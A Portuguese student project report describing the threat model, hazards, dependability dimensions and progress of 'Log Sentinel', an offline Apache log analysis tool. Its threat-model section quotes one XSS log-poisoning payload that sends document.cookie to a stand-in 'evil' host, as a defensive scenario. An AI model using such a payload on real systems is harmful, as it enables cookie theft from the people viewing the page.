# Engenharia de Software II — AV3
## Log Sentinel: falhas, ameaças e dimensões de confiança

IFBA, semestre 2026.1
Equipe: Elder Lopes, Aryan Souza Assis, Rodrigo Cruz, Helena Santos Freitas
Repositório do projeto: https://github.com/202316360036/log-sentinel
Branch desta entrega: `docs/av3-especificacao`
Data de entrega: 16 de junho de 2026

---

## Apresentação

O Log Sentinel é a ferramenta que escolhemos desenvolver para a disciplina. A ideia é simples: ajudar um administrador de sistema a investigar um incidente já ocorrido em um servidor Apache, lendo o `access.log` do disco e produzindo um relatório com indícios de força bruta, varredura de URLs sensíveis e picos anormais de tráfego. Tudo offline, na própria máquina do operador, sem servidor central, sem telemetria. A interface tem duas faces: uma CLI feita com Typer e uma GUI feita com PySide6, ambas conversando com o mesmo motor de análise (que internamente chamamos de Core).

Este documento reúne, num único arquivo, o que o professor pediu na AV3. Cada uma das próximas seções corresponde a um item da pauta. Os documentos detalhados continuam disponíveis na pasta `docs/av3/` do repositório, mas aqui apresentamos a síntese.

---

## 1. Barreiras, salvaguardas e condições latentes

Adotamos como base o modelo das camadas de defesa de Reason (1990) — o famoso "queijo suíço" — e a noção de defesa em profundidade. Para evitar ambiguidade, fixamos três termos. **Barreira** é um mecanismo que impede que uma falha se propague (validar um caminho de arquivo antes de abri-lo, por exemplo). **Salvaguarda** é um mecanismo que detecta, contém ou mitiga uma falha já ocorrida (registrar a exceção num log estruturado para análise posterior). **Condição latente** é uma fragilidade já presente no projeto que ainda não causou problema, mas pode causar quando um gatilho específico aparecer (uma expressão regular que aceita silenciosamente linhas mal formadas, por exemplo).

### Barreiras

Identificamos nove barreiras distribuídas entre as três camadas do pipeline (entrada, processamento, saída) e uma camada transversal de CI/CD. A tabela abaixo resume cada uma. O estado "ativa" significa que já está rodando no repositório; "planejada" significa que existe a definição mas a implementação acontecerá nas próximas sprints.

| ID | Barreira | Onde fica | Estado |
|----|----------|-----------|--------|
| B0 | Lint (`ruff`) e checagem de tipos (`pyright`) bloqueando merge | CI/CD | ativa |
| B1 | Validação de caminho de arquivo antes de abrir (existência, permissão, tamanho) | CLI/GUI | planejada |
| B2 | Validação do formato Apache linha-a-linha; linha inválida vira um `ParseError` e é descartada, sem parar a execução | Core | planejada |
| B3 | Isolamento por arquivo no modo `batch`: exceção em um arquivo não derruba os outros | Core | planejada |
| B4 | Limite explícito de linhas processadas via flag `--max-lines` (proteção contra log envenenado) | CLI | planejada |
| B5 | Sanitização da saída JSON: escapar `<`, `>` e aspas para evitar execução de script caso o relatório seja aberto em navegador | Core | planejada |
| B6 | GUI executa o processamento em `QThread`, evitando travamento da janela | GUI | planejada |
| B7 | Imports proibidos cross-layer: CI rejeita PR onde `core/` importa `cli/` ou `gui/` | CI/CD | planejada |
| B8 | DAO baseado em geradores (`yield`) em vez de `.read()`, evitando estouro de memória | Core | planejada |

### Salvaguardas

| ID | Salvaguarda | Função | Estado |
|----|-------------|--------|--------|
| S0 | Cobertura de testes acompanhada no CI | Detectar regressão antes do merge | infra pronta, cobertura parcial |
| S1 | Mensagens de erro humanizadas, com sugestão de correção | Reduzir tempo de diagnóstico | planejada |
| S2 | Logging interno estruturado, com nível configurável via `--verbose` | Auditar o próprio Log Sentinel | planejada |
| S3 | Streaming com barra de progresso e botão de abortar | Conter desperdício em processamento longo | planejada |
| S4 | Lista das linhas descartadas pelo parser no relatório final | Operador vê o que ficou de fora | planejada |
| S5 | Confirmação antes de sobrescrever arquivo de saída | Prevenir perda de relatório anterior | planejada |
| S6 | Hash SHA-256 do log incluído no relatório | Cadeia de custódia | planejada |
| S7 | Versão do Log Sentinel embutida no JSON | Rastreabilidade de quem gerou e quando | planejada |
| S8 | SonarCloud opcional na CI | Detecção contínua de smells e CVEs em dependências | ativa |

### Condições latentes

Listar condições latentes nos forçou a um exercício honesto: mesmo o pouco código escrito até aqui já carrega fragilidades dormentes. Mapeamos dez, cada uma associada às defesas que devem cobri-la. As principais são: regex aceitando silenciosamente linhas multi-linha mal formadas (CL-01, mitigada por B2 e S4); ausência de limite de tamanho permitindo DoS por log envenenado (CL-02, mitigada por B4 e S3); uso eventual de `.read()` provocando `MemoryError` em logs grandes (CL-03, mitigada por B8); GUI sem `QThread` congelando durante batch (CL-04, mitigada por B6 e S3); JSON com HTML não escapado podendo executar script em visualizador web (CL-05, mitigada por B5); imports cíclicos entre Core e GUI (CL-06, mitigada por B7 — esse acoplamento, inclusive, já existiu e foi corrigido no commit `15ffa86`); e a pressão acadêmica de calendário levando à fusão de PRs sem revisão suficiente próximo de uma data de avaliação (CL-10, mitigada por branch protection no GitHub).

A leitura cruzada de barreiras, salvaguardas e condições latentes mostra que toda condição é coberta por **pelo menos duas defesas heterogêneas** — esse é o ponto central do princípio de defesa em profundidade. A matriz completa está em `docs/av3/01_BARREIRAS_SALVAGUARDAS.md`.

---

## 2. Propriedades emergentes funcionais e não-funcionais

Uma propriedade emergente é aquela que só aparece quando os componentes operam juntos. O parser sabe interpretar uma linha. O detector sabe avaliar uma janela de eventos. O DAO sabe gravar um relatório. Mas a capacidade de "identificar um ataque de força bruta a partir de um log bruto" não pertence a nenhum desses três — ela emerge da composição. Foi com esse recorte que separamos o que é apenas funcionalidade local do que é genuinamente uma propriedade do sistema.

### Propriedades emergentes funcionais

São oito, sintetizadas a seguir. PEF-01 a PEF-03 correspondem aos três detectores do MVP (força bruta, scanner de URLs sensíveis e pico anormal de tráfego), cada um emergindo da combinação `LogFileDAO + ApacheParser + Detector + ReportDAO`. PEF-04 é a auditoria batch consolidada, que produz um único JSON ordenado cronologicamente a partir de um diretório de logs. PEF-05 é a paridade CLI ↔ GUI: qualquer análise feita por uma interface tem de produzir resultado idêntico na outra, porque ambas dependem do mesmo Core. PEF-06 é o relatório auto-contido e reprodutível, que carrega a versão do app, hash do log de origem e parâmetros usados. PEF-07 é o feedback de progresso responsivo (a barra anda a cada bloco de bytes processado, valendo tanto para Rich na CLI quanto para QProgressBar na GUI). PEF-08 é a cadeia de custódia.

A observação importante aqui é que PEF-01, PEF-02 e PEF-03 não são três funcionalidades soltas. Elas compartilham a espinha dorsal Pipe-and-Filter do pipeline. Isso significa que adicionar um quarto detector amanhã não envolve mexer nos três existentes — basta criar a classe nova e registrá-la. Essa **extensibilidade**, vista de outro ângulo, vira a propriedade emergente PENF-08 mais abaixo.

### Propriedades emergentes não-funcionais

Organizamos pelas categorias da ISO/IEC 25010. Em desempenho, definimos PENF-01 (processar 1 GB de log em até 60 segundos) e PENF-02 (uso máximo de RAM em torno de 200 MB, qualquer que seja o tamanho do log — o que só faz sentido por causa do streaming do DAO). Em confiabilidade, PENF-03 é a resiliência a log parcialmente corrompido (linha ruim não derruba o pipeline) e PENF-04 é o determinismo (mesmo input produz o mesmo JSON byte-a-byte). Em usabilidade, PENF-05 é o "tempo até o primeiro resultado em no máximo três cliques na GUI" e PENF-06 é a propriedade de a janela não congelar durante o processamento, o que depende do `QThread` da barreira B6.

Em manutenibilidade, PENF-07 é a substituibilidade do parser (trocar Apache por Nginx sem tocar em CLI ou GUI, viabilizada pelo padrão Strategy e por uma `ParserFactory`); PENF-08 é a pluggabilidade de detectores; PENF-09 é a meta de cobertura acima de 80% mantida ao longo das refatorações. Em segurança, PENF-10 é a análise totalmente offline (verificada por um linter customizado que rejeita imports de `requests`, `urllib` ou `socket` em `core/`) e PENF-11 é a preservação de integridade do log de origem (o DAO só abre em modo leitura). Por fim, em portabilidade, PENF-12 é a entrega como executável standalone Linux e Windows, viabilizada pelo workflow de PyInstaller já presente no `.github/workflows/`.

Vale destacar que a maioria dessas propriedades ainda está em estado planejado ou parcial. PENF-12 e PENF-09 já têm infra rodando; as demais dependem das próximas sprints. O catálogo completo, com critérios de verificação, está em `docs/av3/02_PROPRIEDADES_EMERGENTES.md`.

---

## 3. Dimensões de confiança do sistema

A literatura clássica (Avizienis, Laprie, Randell e Landwehr, 2004) decompõe a noção de "confiança" em sete dimensões. Decidimos posicionar o Log Sentinel em cada uma delas de forma explícita, em vez de tratar a palavra "confiança" como um adjetivo vago. O resumo abaixo segue essa ordem.

**Safety** (segurança operacional) é sustentada pelo modo read-only do app sobre o arquivo de log (jamais escreve, renomeia ou remove a entrada) e pela idempotência do pipeline (executar duas vezes sobre o mesmo log produz o mesmo relatório). Vai ser verificada por um teste que confere o `mtime` e o hash do log antes e depois da execução.

**Security** (proteção contra ações maliciosas) é sustentada pelo fato de o app ser inteiramente offline — nenhum dado de log sai da máquina — somada à sanitização da saída (B5), ao limite de input (B4) e à cadeia de custódia via hash SHA-256 (S6). O modelo de ameaças completo está no item 5 deste documento.

**Reliability** (continuidade do serviço correto) é sustentada pelo isolamento por arquivo no batch (B3), pelo determinismo do pipeline e pela meta de cobertura de testes acima de 80%, com TDD desde o primeiro commit funcional (o `bfeafd7` é o primeiro teste do projeto, escrito antes do código de produção).

**Availability** (disponibilidade) talvez seja a dimensão de mais fácil sustentação para o nosso caso, justamente porque o Log Sentinel é uma aplicação local de invocação imediata — não há servidor que possa cair. Adicionamos PyInstaller para garantir que o usuário rode mesmo sem Python instalado. Um smoke test mede o tempo de cold start.

**Maintainability** (manutenibilidade) é a dimensão hoje mais madura no nosso projeto. A arquitetura em camadas com Core isolado, os padrões de projeto explícitos (Strategy nos parsers, Factory na criação de DAO/Parser, Pipe-and-Filter no pipeline, Facade no `LogAnalyzer`, Observer nos eventos de progresso) e o CI rodando `ruff` e `pyright` em todo PR formam a base. O SonarCloud opcional dá métrica adicional de dívida técnica.

**Resilience** (resiliência) aparece no parser fail-fast por linha (B2) combinado à lista de descartes (S4), nas mensagens de erro humanizadas (S1) e no encerramento com relatório parcial em caso de interrupção. A ideia é não ter um modo "tudo ou nada": se o operador apertar Ctrl+C no meio de um batch, ele recebe o relatório dos arquivos já processados.

**Privacy** (privacidade) é sustentada por três decisões: zero telemetria, logs que nunca saem da máquina e a flag `--anonymize-ips` (planejada) para mascarar o último octeto do IP quando o relatório precisar ser compartilhado com terceiros. Mensagens de erro também não embutem caminho absoluto do home do usuário em modo anonimizado, para evitar vazamento em screenshots compartilhados.

A maturidade de implementação varia bastante entre as dimensões. Resumindo: Availability e Maintainability já têm a infraestrutura ativa; Reliability está em construção; Safety, Security, Resilience e Privacy estão majoritariamente em fase de planejamento, com as decisões de design documentadas mas os mecanismos ainda por implementar. Assumimos isso abertamente porque é informação que o avaliador precisa ter — e porque uma das nossas próprias regras é evitar o discurso vazio de confiança.

Alguns trade-offs foram assumidos conscientemente. Escolhemos streaming em vez de carregar o log inteiro, sacrificando a possibilidade de calcular tudo em uma única passagem. Escolhemos determinismo do JSON (testes de snapshot) sabendo que mudanças de formato vão ser mais cerimoniosas. Escolhemos manter o app offline em vez de enriquecer com GeoIP via API, porque privacidade e disponibilidade são para nós mais importantes que enriquecimento. Quem quiser geolocalização no futuro terá que via plugin opcional. Detalhe completo em `docs/av3/03_DIMENSOES_CONFIANCA.md`.

---

## 4. Perigos, acidentes e danos em potencial

Trabalhamos aqui com três termos distintos. **Perigo** é a condição do sistema (ou do ambiente) que, se combinada a um gatilho, pode levar a um acidente; é potencial, não realizado. **Acidente** é o evento não planejado que realiza esse perigo e produz uma consequência indesejada. **Dano** é a consequência efetiva — material, operacional, reputacional, legal — sofrida por algum stakeholder. Essa separação vem da literatura de safety (Leveson, 2011; IEC 61508).

Como o Log Sentinel é uma ferramenta de análise post-mortem local, ele não controla atuadores nem influencia processos físicos em tempo real. Isso muda a paisagem dos danos: o que está em jogo são consequências operacionais, decisórias e reputacionais — bloquear um IP errado, deixar de detectar um ataque em curso, vazar dado pessoal por descuido. Não é menos grave; é diferente.

Os stakeholders relevantes são o sysadmin que opera a ferramenta (tempo, credibilidade, decisões erradas), a empresa que opera o servidor (postura de segurança, evidência em eventual processo, conformidade LGPD/SOX/PCI), os usuários finais do servidor (privacidade dos seus IPs e User-Agents, risco de bloqueio injusto), a equipe do Log Sentinel (confiabilidade percebida e nota acadêmica) e a máquina do operador (RAM, disco, CPU).

Catalogamos treze perigos, cada um com gatilho, acidente realizado, dano resultante, severidade, probabilidade e mitigação correspondente. Os três que avaliamos como de risco crítico merecem destaque:

**HZ-01 — Falso negativo: ataque real não detectado.** É a categoria que mais preocupa, porque o dano é alto (ataque continua em curso) e o sintoma é a *ausência* de sintoma (o operador lê um relatório limpo e arquiva o caso). Severidade catastrófica, probabilidade ocasional. Mitigação combinada: B2 com lista de descartes (operador enxerga o que ficou de fora), S4, threshold configurável e testes com logs reais conhecidos.

**HZ-02 — Falso positivo: usuário legítimo acusado.** O detector marca um crawler do Google ou um cliente atrás de NAT corporativo como força bruta; o sysadmin bloqueia o IP; o SEO da empresa cai por dois dias. Severidade crítica, probabilidade provável (se não houver allowlist). Mitigação: threshold configurável, allowlist de IPs e User-Agents, exibir o contexto da detecção no relatório (não apenas o IP).

**HZ-03 — Estouro de memória durante análise.** Pipeline carrega arquivo inteiro em RAM (`.read()` ou `.readlines()`). Log de 5 a 10 GB numa máquina de 4 a 8 GB de RAM aciona o OOM-killer no meio da análise. Severidade crítica, probabilidade provável sem barreira. Mitigação: B8 (geradores e streaming) elimina a categoria inteira, e PENF-02 amarra um teste de carga ao redor da meta de 200 MB de RAM.

Os perigos de risco alto incluem o disco enchendo por relatório gigante sem `--summary` (HZ-04, mitigado por padrão de só métricas agregadas), sobrescrita silenciosa do relatório anterior por cron mensal (HZ-05, mitigado por S5 e sufixo de timestamp), travamento da GUI durante batch longo (HZ-06, mitigado por B6), exposição de dados pessoais em relatório compartilhado em chat público (HZ-07, mitigado por `--anonymize-ips` e aviso ao exportar), DoS no próprio Log Sentinel por log envenenado (HZ-10, mitigado por B4), vazamento de informação por stack trace cru em chat público (HZ-12, mitigado por S1) e merge de PR sem revisão na véspera de uma AV (HZ-13, mitigado por branch protection).

Risco médio: cadeia de custódia quebrada por hash não embutido (HZ-08), XSS reflexivo via relatório aberto em navegador (HZ-09) e regressão de parser que altera análises de logs antigos (HZ-11). A tabela com todos os treze perigos, severidade, probabilidade e estado da mitigação está em `docs/av3/04_PERIGOS_ACIDENTES_DANOS.md`.

A ordem de tratamento que combinamos para os próximos 30 dias é: HZ-01 e HZ-02 primeiro (são o coração do produto), depois HZ-03 (B8 elimina uma categoria inteira de problemas), depois HZ-10 (B4 é literalmente uma linha de código), e em seguida HZ-06 (sem ele, a demo da AV4 não roda). HZ-05 e HZ-12 são baratos e visíveis na apresentação. Os demais ficam para a janela AV4-AV5.

---

## 5. Ativos, vulnerabilidades, ataques, ameaças e exposições

Para essa parte adotamos vocabulário do NIST SP 800-30 e do STRIDE, organizando em cinco listas — ativos, vulnerabilidades, agentes de ameaça, ataques concretos e superfícies de exposição. Antes de listar é importante lembrar do contexto: o Log Sentinel é uma ferramenta local, offline, single-user. O perímetro a defender não é um servidor exposto à internet — é a máquina do operador e a integridade dos relatórios que ele gera. Isso muda muito o modelo de ameaças tradicional.

### Ativos

Identificamos dez. Os de criticidade alta são o arquivo de log de origem (A-01, evidência primária), o relatório gerado em JSON (A-02, base de decisões operacionais), o hash do log embutido no relatório (A-03, sustenta a cadeia de custódia), o código-fonte do próprio Log Sentinel (A-04, compromisso ali contamina tudo), o pipeline de CI/CD e seus segredos (A-05, pivot para o repositório), a máquina do operador (A-07, RAM, CPU, cookies, chaves SSH) e os dados pessoais embutidos no log (A-08, IPs e User-Agents são pessoais sob LGPD). Os de criticidade média são o binário PyInstaller distribuído (A-06, vetor para ataque a usuários se substituído), a reputação do projeto (A-09) e as dependências de PyPI e GitHub Actions (A-10, supply-chain).

### Vulnerabilidades

Listamos dezesseis, com referência à CWE quando há equivalente. As principais são regex catastrófica habilitando ReDoS (V-01, CWE-1333), carregar o arquivo inteiro em memória (V-02, CWE-400), saída sem escape gerando XSS no visualizador (V-03, CWE-79), caminho não validado no `--output` permitindo path traversal (V-04, CWE-22), stack trace cru vazando caminhos com nome de usuário (V-05, CWE-209), sobrescrita silenciosa do arquivo de saída (V-06), dependência transitiva vulnerável (V-09, CWE-1104), workflow CI executando código de PR sem `permissions:` restritas (V-10), hash do log calculado depois da leitura (V-14, CWE-367 — TOCTOU) e confiança implícita no conteúdo de campos como User-Agent ou Referer (V-15). Algumas vulnerabilidades clássicas estão *prevenidas por design*: não usamos `subprocess` ou `os.system` (V-07 não se aplica) nem `pickle` ou `yaml.load` (V-08 não se aplica).

### Agentes de ameaça

Mapeamos sete. O mais óbvio é o atacante remoto que controla o servidor web sendo auditado (AG-01), porque ele pode injetar conteúdo arbitrário no log (User-Agent, path, Referer). Em seguida vêm o operador desatento (AG-02, sem malícia), o insider mal-intencionado com acesso à mesma máquina (AG-03), o atacante de supply chain via pacote PyPI comprometido (AG-04), o atacante de canal de distribuição que substitui o binário PyInstaller publicado (AG-05), o estudante ou curioso abrindo forks e PRs (AG-06) e o próprio auditor ou juiz examinando a evidência (AG-07, que não é hostil, mas a evidência precisa resistir ao escrutínio dele).

### Modelo STRIDE

Aplicado ao Log Sentinel, o STRIDE fica assim, em uma linha por categoria. **Spoofing**: substituição do binário publicado (mitigada por checksum em release notes). **Tampering**: troca do log entre leitura e cálculo do hash (mitigada por hash em streaming na mesma leitura — combate à TOCTOU). **Repudiation**: o operador alega não ter rodado a análise (mitigada pela versão, parâmetros e timestamp no relatório — S7). **Information Disclosure**: stack trace vazando paths ou JSON com IPs intactos (mitigada por S1, B5 e `--anonymize-ips`). **Denial of Service**: log envenenado ou ReDoS no parser (mitigada por B4 e regex sem backtracking). **Elevation of Privilege**: dependência transitiva maliciosa ou workflow CI mal configurado (mitigada por Dependabot e `permissions:` mínimas).

### Ataques concretos previstos

Sete cenários receberam descrição detalhada. O mais ilustrativo é o **AT-01, log poisoning via User-Agent**: o atacante (AG-01) envia uma requisição com `User-Agent: <script>fetch('https://evil/?c='+document.cookie)</script>`; a linha é gravada normalmente no `access.log`; o operador exporta o relatório em JSON e abre num visualizador web; o script executa na máquina do operador e os cookies são exfiltrados. Severidade crítica. A contramedida é B5 (sanitização) somada à orientação na documentação de só abrir relatórios em editor de texto ou visualizador JSON dedicado.

Os demais ataques são **AT-02 ReDoS no parser Apache** (linha construída para disparar backtracking exponencial em uma regex Python; mitigação: validar com biblioteca `regex` ou `re2`, timeout por linha, flag `--max-line-bytes`); **AT-03 path traversal no `--output`** (mitigação: resolver path absoluto e recusar saídas fora do CWD por padrão); **AT-04 supply chain via PyPI** (mitigação: `pdm.lock` versionado, Dependabot, fixar versões, permissions mínimas nas Actions); **AT-05 TOCTOU no hash do log** (mitigação: abrir o arquivo uma vez e calcular hash durante o mesmo streaming usado pelo parser); **AT-06 bomba de zip** (relevante se adicionarmos suporte a `.log.gz`, mitigação por limite de bytes descompactados); e **AT-07 engenharia social no canal de Issues** (mitigada por branch protection + 1 review obrigatório).

### Superfícies de exposição

Listamos sete. A mais hostil é a entrada — o arquivo de log — porque seu conteúdo é controlado por um atacante remoto (AG-01). A diretriz é tratá-lo como **não confiável**, com sanitização agressiva (B2, B5) e limite de tamanho (B4). Em ordem decrescente de hostilidade: dependências de PyPI, workflows do GitHub Actions, releases de binários, saída JSON (que pode acabar em browser, então deve ser tratada como conteúdo público), CLI args do operador (confiável, mas com validação de paths) e configuração de detectores via YAML (não usar `yaml.load`).

A tabela cruzada ativo × vulnerabilidade × ataque está em `docs/av3/05_AMEACAS_VULNERABILIDADES.md`, junto com um plano de tratamento priorizado por relação esforço/impacto.

---

## 6. Link do repositório

O Log Sentinel vive em https://github.com/202316360036/log-sentinel.

A branch desta entrega é `docs/av3-especificacao`. Todos os documentos AV3 referenciados acima estão em `docs/av3/`. O `master` reflete a entrega da AV2 (testes de software) integrada. A página HTML interativa de estudo está hospedada via GitHub Pages.

---

## 7. Commits por integrante

Janela considerada: 8 de abril de 2026 (commit inicial do repositório) até 16 de junho de 2026 (data desta entrega). O comando que reproduz a contagem é `git shortlog -sn --all --no-merges --since=2026-04-01 --until=2026-06-17`.

| Integrante | Papel principal | Commits |
|------------|------------------|--------:|
| Elder Lopes (`202316360036`) | CI/CD, releases, documentação | 9 |
| Aryan Souza Assis | Core (parsers, modelos, detectores) | 9 |
| Rodrigo Cruz | CLI com Typer | 4 |
| Helena Santos Freitas | GUI com PySide6 | 2 |

Total da equipe: 24 commits úteis no período.

Duas observações de honestidade. Primeiro: aparece um nome "Andre" no `git log` — não é integrante da equipe; é o autor do template `andre-romano/python_pdm_template` que usamos como base, então o commit dele veio junto no merge inicial. Segundo: aparecem dois nomes para o Aryan (`Aryan Souza Assis` com 8 commits e `Aryan Assis` com 1), porque o commit "Add as coisas" foi feito com config local de git diferente. É a mesma pessoa, totalizando 9 commits.

O detalhamento commit-a-commit está em `docs/av3/APENDICE_COMMITS.md`. Há uma lacuna evidente: entre 13 de maio e 16 de junho não houve commit de código novo. Esse foi um período em que outras disciplinas tomaram nossa atenção, e a partir do dia 10 de junho retomamos com foco na documentação AV3. Não é uma situação que queiramos repetir, e o replanejamento na seção 10 deste documento detalha como retomamos.

---

## 8. Issues finalizados

Dados puxados via `gh issue list --repo 202316360036/log-sentinel --state all --limit 200` com corte em 16/06/2026.

No período de 8 de abril até 16 de junho, o repositório acumulou 25 issues. Destas, 12 foram fechadas até o corte e 13 permaneciam abertas. A distribuição por integrante, considerando o assignee no GitHub, ficou conforme a tabela abaixo:

| Integrante | Issues fechadas |
|------------|----------------:|
| Elder | 8 |
| Rodrigo | 2 |
| Aryan | 0 |
| Helena | 0 |
| Marcos de avaliação sem assignee | 2 |

As issues ainda abertas no fechamento desta entrega cobrem exatamente o que está planejado para as próximas sprints: do lado do Core, as cinco issues do MVP (`LogEntry` — já implementada, mas a issue segue marcada —, `ApacheLogParser`, `BruteForceDetector`, `ScannerDetector` e `LogFileDAO`/`ReportDAO`); do lado da CLI, o `analyze` real com filtros; do lado da GUI, o esqueleto da MainWindow e o drag-and-drop; e os marcos AV3 (a ser fechada após a apresentação), AV4 e AV5.

Vale observar que parte do trabalho registrado em commits não foi acompanhada do fechamento da issue correspondente. Encaramos isso como uma falha de processo da equipe — não de uma pessoa específica — e combinamos corrigir na próxima sprint, fechando cada issue conforme os PRs forem mergeando.

---

## 9. Percentuais de finalização dos milestones

Dados puxados via `gh api repos/202316360036/log-sentinel/milestones?state=all`.

| Milestone | Vencimento | Fechadas / Abertas | % concluído |
|-----------|------------|-------------------:|------------:|
| AV1 — Ambiente | 14/04/2026 | 1 / 0 | 100% |
| Sprint 0 — Setup & Documentação | 11/05/2026 | 9 / 0 | 100% |
| AV2 — Testes de Software | 12/05/2026 | 1 / 0 | 100% |
| Sprint 1 — Core MVP | 08/06/2026 | 1 / 5 | 17% |
| AV3 — Falhas de Software | 16/06/2026 | 0 / 1 (issue rastreadora) | docs 100% / demo em esqueleto |
| Sprint 2 — CLI & GUI | 30/06/2026 | 0 / 3 | 0% |
| AV4 — Seminário | 22/07/2026 | 0 / 1 | 0% |
| AV5 — Riscos e Qualidade | 11/08/2026 | 0 / 1 | 0% |
| Sprint 3 — Polimento e Release | 12/08/2026 | 0 / 0 | a planejar |

Os marcos acadêmicos (AV1, Sprint 0, AV2) estão fechados em 100%. A Sprint 1 do Core MVP está em 17%, o que reflete a lacuna mencionada na seção 7 e justifica a demo em esqueleto. A milestone AV3 do GitHub permanece aberta até a apresentação porque a sua issue rastreadora é encerrada na apresentação — mas a entrega documental (o que está neste arquivo, mais os cinco documentos detalhados em `docs/av3/`) foi congelada na data desta entrega.

---

## 10. Atualização das previsões de entrega

A previsão original do projeto, montada na AV2, supunha que a Sprint 1 do Core MVP estaria pronta até 8 de junho e que a Sprint 2 de CLI e GUI estaria 60% completa até 16 de junho. Isso não aconteceu. As razões honestas são duas: a lacuna de commits entre 13 de maio e 10 de junho (seção 7) e a subestimação do esforço dos parsers Apache, que envolvem mais casos especiais do que projetamos no papel.

Replanejamento por integrante para as próximas semanas, registrado no Gantt revisado em `docs/GANTT.md`:

**Aryan (Core).** Entre 18 e 22 de junho, `ApacheParser` para os formatos Common e Combined, com testes unitários. Entre 19 e 23 de junho, `LogFileDAO` com streaming linha-a-linha e cálculo de hash SHA-256 em conjunto. Em 22 de junho, `BruteForceDetector` com janela de tempo deslizante e teste sobre `tests/fixtures/sample_brute_force.log`. Entre 26 e 30 de junho, `ScannerDetector` e primeira iteração de `TrafficSpikeDetector`. Entre 1 e 3 de julho, `Pipeline` e `Aggregator` integrando os detectores.

**Rodrigo (CLI).** Entre 22 e 25 de junho, comando `analyze` real substituindo o stub atual, chamando o ApacheParser. Entre 25 e 27 de junho, `detect brute-force` com saída formatada via Rich. Entre 27 de junho e 2 de julho, comando `batch` com flag `--output json`. Entre 2 e 5 de julho, flags de hardening (`--anonymize-ips`, `--max-lines`).

**Helena (GUI).** Em 20 de junho, criar o entry point `pdm run gui` no `pyproject.toml`, para evitar o one-liner gigante na demo. Entre 23 e 26 de junho, worker em `QThread` chamando o ApacheParser e `QTableView` com as colunas IP, timestamp, método e status. Entre 27 de junho e 1 de julho, drag-and-drop de arquivo `.log` e filtros básicos por IP e status. Entre 2 e 5 de julho, exportação JSON e barra de progresso conectada ao worker.

**Elder (CI/CD e documentação).** Em 18 de junho, atualizar o GANTT, fechar o relatório AV3 e abrir uma issue por integrante referente à sprint pré-AV3. Em 5 de julho, configurar branch protection no `master` e atualizar o apêndice de commits. Entre 15 e 29 de julho, preparar release v0.1.0 com PyInstaller para Linux e Windows.

Em 6 de julho está marcado um smoke test ponta-a-ponta com gravação de demo curta (3 min). Em 7 de julho, ensaio cronometrado com alvo de 25 minutos. A apresentação propriamente dita está prevista para 8 de julho de 2026 — data prorrogada pelo professor a partir do prazo original de 17 de junho. A entrega documental, no entanto, foi congelada hoje, em 16 de junho, conforme o cronograma original.

Os marcos posteriores ao 8 de julho seguem dentro do prazo: Release v0.1.0 entre 15 e 29 de julho, AV4 (Seminário) em 22 de julho, sprint de hardening (B4, B5, B8, S1, S5, S6 e cobertura acima de 80%) entre 23 de julho e 12 de agosto, AV5 em 12 de agosto, prova final em 19 de agosto.

---

## 11. Demonstração breve do aplicativo

O que roda hoje, em 16 de junho, é honestamente um esqueleto. Não escondemos isso.

A CLI tem o pacote criado e responde ao `--help`. Rodando `python -m python_pdm_template.cli.main --help` o operador vê os dois subcomandos planejados: `analyze` (que vai receber um arquivo de log e produzir um relatório) e `batch` (que vai receber um diretório e produzir um relatório consolidado). Hoje, ao invocar `python -m python_pdm_template.cli.main analyze access.log`, a saída é literalmente `"Analisando access.log... (nao implementado ainda)"`. O esqueleto está lá, a conexão com o Core acontecerá na sprint pré-AV3 conforme a seção 10.

A GUI tem o pacote criado e a `MainWindow` em PySide6 abre uma janela 1024×768 com o texto "Em construção". Ainda não há entry point `pdm run gui` — para abrir manualmente, é necessário invocar `pdm run python -c "from python_pdm_template.gui.main_window import MainWindow; from PySide6.QtWidgets import QApplication; import sys; a=QApplication(sys.argv); w=MainWindow(); w.show(); a.exec()"`. A criação do entry point é uma das tarefas da Helena para 20 de junho.

A camada de testes tem um teste passando: `test_log_entry_armazena_campos_obrigatorios`, que valida a `dataclass` `LogEntry`. Foi escrito antes do código de produção (commit `bfeafd7`, TDD). `pdm run pytest -q` retorna `1 passed`. A integração contínua roda o teste a cada PR e está verde no `master`. O badge do CI no README confirma isso.

A camada de CI/CD é a que está mais consolidada. Workflow do `ci.yaml` rodando `ruff`, `pyright` e `pytest`. SonarCloud configurado como opcional (não bloqueia se o token não estiver presente, o que evita travar o pipeline em forks de colegas). Workflow de release com PyInstaller para Linux e Windows pronto, à espera da primeira tag estável. Página de estudo HTML hospedada via GitHub Pages.

O roteiro de demonstração que combinamos para a apresentação parte dessa realidade: mostrar `git log --oneline -10` para o ritmo do projeto, rodar `pytest` para a saúde do código, abrir a CLI para o `--help`, abrir a GUI para a janela "Em construção", abrir o GitHub Actions para o pipeline verde e exibir os cinco documentos AV3 publicados. Se até 6 de julho — final da sprint pré-AV3 — o Core estiver pronto, os dois passos centrais (CLI e GUI) são substituídos por análise real de `tests/fixtures/sample_brute_force.log` com reprodução da mesma análise na GUI, ilustrando a propriedade emergente PEF-05 (paridade CLI ↔ GUI).

Reconhecemos abertamente que esse estado de demonstração é o desdobramento direto da Sprint 1 estar em 17% (seção 9). Não pretendemos passar isso como vitória. Pretendemos mostrar que sabemos exatamente onde estamos, por que estamos, e o que precisa acontecer nas próximas três semanas para chegar à AV3 (8 de julho) com algo que vá além do esqueleto.

---

*Documento elaborado pela equipe Log Sentinel como entrega da AV3 — Engenharia de Software II, IFBA 2026.1. Os documentos detalhados que embasam cada seção estão na pasta `docs/av3/` do repositório.*
